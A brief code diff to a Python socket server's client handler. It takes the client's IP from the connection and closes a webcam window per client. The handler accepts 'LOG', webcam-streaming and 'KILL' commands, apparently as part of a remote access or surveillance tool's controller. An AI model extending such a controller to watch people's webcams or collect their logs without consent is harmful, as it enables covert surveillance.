@@ -175,7 +175,7 @@ def handle_client(client_socket, client_address):
                 client_info = json.loads(data.decode())
                 data_command = client_info.get('command')
 
-                ip = str(socket.gethostbyname(socket.gethostname()))
+                ip = client_address[0]
                 date = time.strftime("%d-%m-%Y")
 
                 if data_command == 'LOG':
@@ -231,6 +231,7 @@ def handle_client(client_socket, client_address):
                     cv2.imshow(f"Webcam {client_address}", image)
 
                     if cv2.waitKey(1) & 0xFF == ord('q'):
+                        cv2.destroyWindow(f"Webcam {client_address}")
                         break
 
                 elif data_command == 'KILL':
